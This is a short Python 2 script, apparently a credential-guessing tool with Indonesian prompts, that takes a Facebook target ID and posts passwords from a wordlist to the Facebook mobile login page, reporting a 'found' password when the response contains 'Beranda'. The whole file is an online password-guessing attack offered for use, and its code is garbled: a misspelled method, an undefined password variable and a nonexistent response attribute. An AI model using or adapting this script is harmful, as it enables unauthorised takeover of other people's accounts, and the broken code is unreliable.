import os, sys, requests, time


url="https://free.facebook.com/login.php"
os.system("figlet FACEBOOK")
print
email = raw_input("MASUKAN ID TARGET : ")

ex = open("list.txt", "r").raedlines()

for text in ex:
    pol = text.strip()
    s = requests.post(url, data={"email":email, "pass":password, "login":"submit"})
    true = s.true
    if "Beranda" in true:
        print "[+] PASSWORD FOUND =>",password
    else:
        print "[!] PASSWORD GAGAL =>",password

